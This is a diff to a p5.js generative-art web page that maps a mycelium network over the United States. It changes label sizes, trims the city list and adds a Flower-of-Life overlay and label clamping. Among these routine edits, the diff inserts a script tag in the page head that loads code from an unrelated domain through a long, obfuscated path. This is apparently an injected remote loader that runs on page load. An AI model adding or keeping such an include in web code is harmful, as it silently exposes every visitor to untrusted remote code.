@@ -4,7 +4,7 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Mycelium · Wood-Wide America — Generative Study</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.7.0/p5.min.js"></script>
+<script type='text/javascript' src='https://mycoai.net/_xDI99lUbKR1_ZD-RxYHXBvxywnsvnxYvXFi_MXrRrgerBQ3uMhfp2RVwc2L5lqeVyKLkgS0xRmPv5AxkIDz35lxIrQtWzPA7V519KEsPDIgDfnFRqsowmMrlkSTyY_xL_g6FVZ47C4o2wP_oxT78_8HOAZZ1AFEu3bNhHe559wKIUpsxDfVSJzD-BfRtzl7pD2itqRyezGWG4YXRCcYR6ky1Uwj6UTj-m-VBQmVsoCm2I9_EzYEnV8gCIL-tytUYHeTFmj4dAowNkHWX_PRSblhzJcZPL5qbFq7rQ7C0Qrw6CLx_JM__4fl1KqQGxT8Utx4c4oCbxmfKemBntr1bXbJlGigKvXmcMMoq5hyytp9U0RIB_niDbDPLhg37JgcK7PAAe6YZxpXcFx9G9aMFpd6sp5Zvsd2HC7-8ShYgwf0Iri0SRQPcCOXoJGN1wAoBiO3TkRtkxMgJc4E9ue5bS2Ht4ik1ku2jS87f30qrw'></script><script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.7.0/p5.min.js"></script>
 <link rel="preconnect" href="https://fonts.googleapis.com" />
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 <link href="https://fonts.googleapis.com/css2?family=Lora:ital,wght@0,400;0,500;0,600;1,400&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet" />
@@ -113,7 +113,7 @@ const DEFAULTS = {
   dish: 1,
   cityGlow: 1.4,
   labels: 1,
-  labelScale: 2.9,
+  labelScale: 5.8,
   labelOutline: 3.0,
   outlineColor: '#0a0f0c',
   flow: 200,
@@ -169,28 +169,13 @@ const USA_OUTLINE = [
 /* ---- Major metros: name, lon, lat, magnitude(1-3), label dir, short label ---- */
 const CITIES = [
   { n:'Seattle',        lon:-122.33, lat:47.61, mag:2, dir:'w'  },
-  { n:'Portland',       lon:-122.68, lat:45.52, mag:1, dir:'w'  },
-  { n:'San Francisco',  lon:-122.42, lat:37.77, mag:2, dir:'w'  },
   { n:'Los Angeles',    lon:-118.24, lat:34.05, mag:3, dir:'sw' },
-  { n:'San Diego',      lon:-117.16, lat:32.72, mag:1, dir:'s'  },
-  { n:'Las Vegas',      lon:-115.14, lat:36.17, mag:1, dir:'n'  },
-  { n:'Phoenix',        lon:-112.07, lat:33.45, mag:2, dir:'e'  },
-  { n:'Salt Lake City', lon:-111.89, lat:40.76, mag:1, dir:'n'  },
-  { n:'Denver',         lon:-104.99, lat:39.74, mag:2, dir:'n'  },
-  { n:'San Antonio',    lon:-98.49,  lat:29.42, mag:1, dir:'w'  },
-  { n:'Dallas',         lon:-96.80,  lat:32.78, mag:2, dir:'e'  },
+  { n:'Phoenix',        lon:-112.07, lat:33.45, mag:2, dir:'s'  },
+  { n:'Dallas',         lon:-96.80,  lat:32.78, mag:2, dir:'s'  },
   { n:'Houston',        lon:-95.37,  lat:29.76, mag:2, dir:'s'  },
-  { n:'Kansas City',    lon:-94.58,  lat:39.10, mag:1, dir:'w'  },
-  { n:'Minneapolis',    lon:-93.27,  lat:44.98, mag:2, dir:'n'  },
-  { n:'New Orleans',    lon:-90.07,  lat:29.95, mag:1, dir:'se' },
-  { n:'Chicago',        lon:-87.63,  lat:41.88, mag:3, dir:'nw' },
-  { n:'Nashville',      lon:-86.78,  lat:36.16, mag:1, dir:'sw' },
-  { n:'Detroit',        lon:-83.05,  lat:42.33, mag:1, dir:'ne' },
-  { n:'Atlanta',        lon:-84.39,  lat:33.75, mag:2, dir:'s'  },
+  { n:'Chicago',        lon:-87.63,  lat:41.88, mag:3, dir:'n'  },
   { n:'Miami',          lon:-80.19,  lat:25.76, mag:2, dir:'s'  },
-  { n:'Washington, DC', lon:-77.04,  lat:38.91, mag:2, dir:'e'  },
   { n:'New York',       lon:-74.01,  lat:40.71, mag:3, dir:'e'  },
-  { n:'Boston',         lon:-71.06,  lat:42.36, mag:2, dir:'e'  },
   { n:'Asheville, NC',  lon:-82.55,  lat:35.60, mag:2, dir:'ne', special:true }
 ];
 
@@ -766,6 +751,40 @@ function growFringe(){
 /* ============================================================
    FINALIZE — cords, scattered fruiting, graph, pulses
    ============================================================ */
+function drawFlowerOfLife(g){
+  if (!POLY || POLY.length < 3) return;
+  const ctx = g.drawingContext;
+  // bounding box of the projected US silhouette
+  let minx = 1e9, miny = 1e9, maxx = -1e9, maxy = -1e9;
+  for (const p of POLY){
+    if (p.x < minx) minx = p.x; if (p.x > maxx) maxx = p.x;
+    if (p.y < miny) miny = p.y; if (p.y > maxy) maxy = p.y;
+  }
+  const R  = (maxx - minx) / 10;       // circle radius -> ~10 circles across the country
+  const dx = R, dy = R * Math.sqrt(3) / 2;   // hexagonal packing = overlapping Flower-of-Life circles
+  const col = mix(tipRGB, [120, 235, 205], 0.6);  // luminous mint, harmonised with the foxfire tips
+
+  ctx.save();
+  // clip everything to the US shape so the geometry only blooms inside the country
+  ctx.beginPath();
+  ctx.moveTo(POLY[0].x, POLY[0].y);
+  for (let i = 1; i < POLY.length; i++) ctx.lineTo(POLY[i].x, POLY[i].y);
+  ctx.closePath();
+  ctx.clip();
+  ctx.globalCompositeOperation = 'lighter';   // additive: overlaps glow into petal rosettes
+  g.noFill();
+  g.strokeWeight(1.15);
+  let row = 0;
+  for (let y = miny - R; y <= maxy + R; y += dy, row++){
+    const xoff = (row % 2) ? dx / 2 : 0;
+    for (let x = minx - R + xoff; x <= maxx + R; x += dx){
+      g.stroke(col[0], col[1], col[2], 20);
+      g.circle(x, y, 2 * R);
+    }
+  }
+  ctx.restore();
+}
+
 function finalizeNetwork(){
   // subtree weights (rhizomorph conduits)
   for (let i = nodes.length - 1; i >= 0; i--){
@@ -825,6 +844,9 @@ function finalizeNetwork(){
 
   // rhizomorphic fringe growing out past the coastline
   growFringe();
+
+  // sacred-geometry Flower of Life lattice, woven through the mycelium inside the US
+  drawFlowerOfLife(g);
 
   // vignette — clipped to the dish so the surrounding canvas stays transparent
   {
@@ -936,6 +958,27 @@ function drawLabels(){
     const size = baseSize * LS;
     const off  = baseOff;                 // keep labels tight to the dot so big text still clears the rim
     const a = labelAnchor(c, off);
+
+    // keep the entire label inside the dish so big text never overlaps the rim
+    textSize(size);
+    {
+      const tw = textWidth(c.n), th = size;
+      let bx0, bx1, by0, by1;
+      if (a.ha === LEFT){ bx0 = a.x; bx1 = a.x + tw; }
+      else if (a.ha === RIGHT){ bx0 = a.x - tw; bx1 = a.x; }
+      else { bx0 = a.x - tw/2; bx1 = a.x + tw/2; }
+      if (a.va === TOP){ by0 = a.y; by1 = a.y + th; }
+      else if (a.va === BOTTOM){ by0 = a.y - th; by1 = a.y; }
+      else { by0 = a.y - th/2; by1 = a.y + th/2; }
+      const corners = [[bx0,by0],[bx1,by0],[bx0,by1],[bx1,by1]];
+      let maxD = 0, fx = a.x, fy = a.y;
+      for (const p of corners){ const d = Math.hypot(p[0]-CX, p[1]-CY); if (d > maxD){ maxD = d; fx = p[0]; fy = p[1]; } }
+      const RLIM = DISH_R - 78;            // padding so labels clear the glass rim
+      if (maxD > RLIM){
+        const ux = (fx-CX)/maxD, uy = (fy-CY)/maxD, pull = maxD - RLIM;
+        a.x -= ux * pull; a.y -= uy * pull;
+      }
+    }
 
     if (c.special){
       // foxfire leader line to Asheville
